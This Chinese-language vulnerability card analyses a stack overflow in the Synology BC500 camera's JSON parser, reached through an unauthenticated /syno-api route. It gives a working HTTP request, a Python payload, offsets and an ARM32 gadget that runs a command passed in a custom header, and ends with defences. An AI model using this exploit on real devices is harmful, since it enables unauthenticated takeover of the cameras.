---
id: binary-pwn-stack-synology-bc500-jansson-parse-object-sscanf-overflow
title: Synology BC500 摄像头 libjansson parse_object 的 sscanf("%s %s") 栈溢出：未授权 JSON key 打穿 v9/v10，ARM32 gadget 执行 $HTTP_A 命令
type: scenario
domain: binary
path: binary/pwn/stack
technique: synology-bc500-jansson-parse-object-sscanf-key-overflow
aliases:
- Synology BC500 栈溢出
- libjansson parse_object 溢出
- sscanf %s 无宽度限制
- synocam_param.cgi json_loads
- Pwn2Own 2023 Synology
- RWCTF 6th Let's party in the house
- $HTTP_A 命令执行
tags:
- pwn
- stack-overflow
- arm32
- rop
- iot
- camera
- json
- jansson
- sscanf
- cve-root-cause
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-10'
updated: '2026-11-11'
verification:
  verified_by: verifier-V494
  verified_at: '2026-11-11T00:26:14+08:00'
  notes: 已对照原文全文核对（本篇无图片）：parse_object 中 _isoc99_sscanf(key,"%s %s",v9[32],v10[12]) 无宽度限制、json_loads→parse_value→parse_object 调用链、webd /syno-api 未匹配路由 execve_cgi synocam_param.cgi、handle_post→final_json_load 均与原文一致；PoC 偏移 0x60+0x24、gadget 0x414D5C(字节 5C 4D 41)、命令放 HTTP 头 A 经 $HTTP_A 执行、cp /flag /www/index.html 与原文 exp 一致。已修正标题错字“键盘溢出”→“栈溢出”。原文未给产品受影响版本（仅比赛镜像 libjansson.so.4.7.0），affected_versions 已清除。未验证点：利用依赖非 PIE 基址与具体固件 gadget 布局。
---

## 一句话结论

Synology BC500 网络摄像头的 `/lib/libjansson.so.4.7.0` 在 `parse_object` 解析 JSON 对象键时执行 `_isoc99_sscanf(key, "%s %s", v9, v10)`，其中 `v9[32]`、`v10[12]` 是固定栈缓冲区且 `%s` 没有宽度限制；攻击者向未授权的 `/syno-api/security/info/mac` 发送一个超长 key 的 JSON 对象，经 `webd → synocam_param.cgi → final_json_load → json_loads → parse_value → parse_object` 触发栈溢出、覆盖返回地址。利用 ARM32 非 PIE 程序里的 `std::string::c_str` 相关 gadget（`binary_base+0x14D5C`），从自定义 HTTP 头 `A:`（CGI 环境变量 `$HTTP_A`）取命令并执行，可把 `/flag` 复制到 Web 根目录。

## 原理

- **有漏洞的 key 解析**：Synology 修改版 jansson 的 `parse_object` 先用 `lex_steal_string` 取出 JSON key，只检查其中是否含 NUL，然后调用 `sscanf(key, "%s %s", v9, v10)` 把 key 拆成两段（用于“key + 后缀”语义）。`%s` 会一直写到空白/NUL 为止，没有 `%31s`/`%11s` 的宽度限制；`v9` 位于 `[sp+0x14]`、`v10` 位于 `[sp+0x34]`（反编译中的 bp 相对偏移），第二个 token 过长时依次覆盖 `v10` 之后的 `len/value/key/object` 局部变量、保存的寄存器与返回地址。
- **未授权可达路径**：`webd` 的 `handle_main` 注册 `/syno-api` 处理器；`/syno-api/*` 中未匹配到具体路由的请求会 `execve_cgi` 到 `/www/camera-cgi/synocam_param.cgi`。该 CGI 的 `handle_post` 从请求 JSON 的 `json` 字段取字符串交给 `final_json_load`，后者调用 `json_loads`（→ `parse_json` → `parse_value` → `parse_object`）。通过 `vue.bundle.js` 提取 API URL、再用 dirsearch 对 `/syno-api` 路径爆破，可发现 `/syno-api/security/info/mac` 等无需认证即返回 200 的入口，因此攻击者不需要任何凭据。
- **为什么能控制执行流**：JSON key 完全由请求体控制；`sscanf` 的第二个 `%s` 把长字符串写到栈上 `v10` 之后，覆盖到函数返回地址。崩溃现场可见 `R3=0x61616161`、PC 在 `strb r2,[r3]`，说明溢出数据已进入寄存器/指针。调整长度（示例 `0x60+0x24` 字节）即可让返回地址落在可控字节上。
- **利用约束与技巧**：
  - `%s` 遇到空格/NUL 停止，且 key 必须是合法 JSON 字符串，因此溢出数据不能含空格；利用时只用一段无空格的 `b` 填充 + 命令占位 + gadget 地址字节。
  - 目标为 ARM32、非 PIE（`binary_base=0x400000`）；gadget 地址 `0x414D5C` 的字节 `5C 4D 41`（`\MA`）可放进 JSON 字符串。ASLR 开启时需按地址/偏移爆破。
  - gadget `0x14D5C`：`STR R3,[R11,#var_30]; LDR R0,[R11,#var_38]; BL std::string::c_str; MOV R2,R0; LDR R3,="r"; ...`，把栈上的 `std::string`（由 `$HTTP_A` 构造）取 `c_str()` 后按 `"r"` 模式执行/打开，从而运行命令。
  - 由于 key 空间有限且不能含空格，真正的命令（含空格的 `cp /flag /www/index.html`）放在自定义 HTTP 头 `A:` 中；CGI 会把它暴露为环境变量 `$HTTP_A`，payload 里只写 `$HTTP_A;`（8 字节）作为命令指针。
- **最终效果**：命令执行后 `/flag` 被复制到 Web 根目录，访问首页即可读取 flag；同一路径也可用于反弹 shell/植入后门（取决于命令）。

## 触发条件

- 目标为存在该漏洞的 Synology BC500 固件/镜像（`/lib/libjansson.so.4.7.0`，Pwn2Own 2023 比赛版本）。
- `webd` 的 `/syno-api` 路由可达；目标未对 JSON key 长度/内容做限制。
- 攻击者能向 `/syno-api/security/info/mac` 一类未授权路由发送 POST JSON（`Content-Type: application/json`）。
- 漏洞利用需要知道/爆破 gadget 地址（非 PIE 基址固定；ASLR 开启时需多次尝试）；ARM32 环境与对应 libc/编译器布局匹配。

## 利用步骤

1. **拿环境/调试**：用题目 run.sh 启动 QEMU 镜像；给 rcS 加 `telnetd -p 8802 -l /bin/sh`，映射端口后拿 shell；把 gdbserver 放进文件系统并重打 `player.cpio`，添加 `hostfwd=tcp:0.0.0.0:1234-:1234`。
2. **找入口**：从 `vue.bundle.js` 提取 `url:"..."` 形式的 API 路径，结合 web 目录字典 dirsearch（排除 404/301/401）发现未授权 `/syno-api` 路由（如 `/syno-api/security/info/mac`）。
3. **定位漏洞**：逆向 `synocam_param.cgi` 的 `handle_post → final_json_load → json_loads`，确认 key 进入 `parse_object` 的 `sscanf("%s %s")`；用 `{"<长key>": ""}` 发送崩溃 PoC，gdbserver attach `webd`，`catch fork`/`catch exec` 跟进 CGI，确认 PC 落在 libjansson 的 `strb`。
4. **确定偏移与基址**：崩溃时读 `R3=0x61616161` 等寄存器；在 libjansson 基址 + `0x6BE0` 断点观察栈，调整 `b` 的数量使返回地址被 4 字节 gadget 覆盖（示例 `0x60+0x24`）。
5. **选 gadget**：在 `synocam_param.cgi`（非 PIE，base 0x400000）中找 `0x14D5C`：把栈上 `std::string` 的 `c_str()` 结果作为命令、`"r"` 作为模式；确认 gadget 地址字节可作为 JSON 字符串字符（`0x414D5C` → `\MA`）。
6. **构造请求**：key = `a ` + `b`*(0x60+0x24-8) + `$HTTP_A;` + `\x5c\x4d\x41`；请求头加 `A: cp /flag /www/index.html`；POST 到未授权路由。
7. **验证**：访问 Web 首页读取被复制的 flag；必要时换命令/换 gadget 做反弹 shell。

## PoC

请求骨架（命令放在自定义头 `A:`，key 里只放 `$HTTP_A;` 与 gadget 地址字节）：

```http
POST /syno-api/security/info/mac HTTP/1.1
Host: <target>:8801
Content-Type: application/json
A: cp /flag /www/index.html

{"a bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb$HTTP_A;\MA": ""}
```

Python 构造要点（ARM32，base 0x400000，gadget 0x14D5C）：

```python
from pwn import *
p1 = b'a ' + b'b' * (0x60 + 0x24 - 8) + b'$HTTP_A;' + b'\x5c\x4d\x41'
json_body = b'{"' + p1 + b'": ""}'
req = (b'POST /syno-api/security/info/mac HTTP/1.1\r\n'
       b'Host: 127.0.0.1:8801\r\n'
       b'Content-Type: application/json\r\n'
       b'A: cp /flag /www/index.html\r\n'
       b'Content-Length: ' + str(len(json_body)).encode() + b'\r\n\r\n' + json_body)
```

无独立可执行 PoC；上述为原文验证过的请求/偏移结构。

## 变体与关联

- **同类 root cause**：任何对不可信输入使用 `sscanf("%s")`/`strcpy`/`sprintf` 且目标为固定栈缓冲区的解析器都可能形成同类溢出；审计时搜索无宽度限制的 `%s` 与固定数组。
- **jansson 定制风险**：上游 jansson 的 key 处理通常不调用 `sscanf`；厂商定制（key 后缀/命名空间）引入的新解析路径是漏洞来源，第三方库版本相同不代表无此问题，需看具体二进制。
- **利用变体**：换 gadget 可直接 `system`/`popen`；命令可放 `$HTTP_A`、`$HTTP_USER_AGENT` 等 CGI 环境变量；ASLR 开启时爆破基址/栈地址；也可用 ROP 链调用 `mprotect` 执行 shellcode。
- **关联卡**：Synology TC500 webd 格式化字符串 RCE（同厂商另一设备/另一类漏洞）、ARM32 栈溢出 ROP 通用卡、IoT 摄像头未授权 CGI 入口。
- **边界**：需要匹配具体固件的库基址/gadget；ASLR、栈保护（若开启 canary）会改变利用方式；不同型号/固件版本的 CGI 路由与偏移可能不同。

## 检测与防御

- **补丁/升级**：升级到修复该 jansson 解析问题的 Synology 固件；无法升级时限制 `/syno-api` 暴露面。
- **代码修复**：禁止对不可信 key 使用无宽度 `%s`；改用 `sscanf("%31s %11s")`、`strtok_r` 或长度校验；对 JSON key 做最大长度限制。
- **访问控制**：所有 `/syno-api` 路由强制认证/授权，未匹配路由不要直接落到 CGI；限制摄像头管理接口仅内网/白名单访问。
- **检测**：监控超长 JSON key、含 `%`/控制字符的 key、异常 500/崩溃与 `synocam_param.cgi` 重启；IDS 可对 `/syno-api` POST 的异常 JSON 结构告警。
- **加固**：开启 ASLR/NX/栈保护，减少可用 gadget；对 IoT 设备做固件签名与完整性校验；把摄像头放在隔离 VLAN。
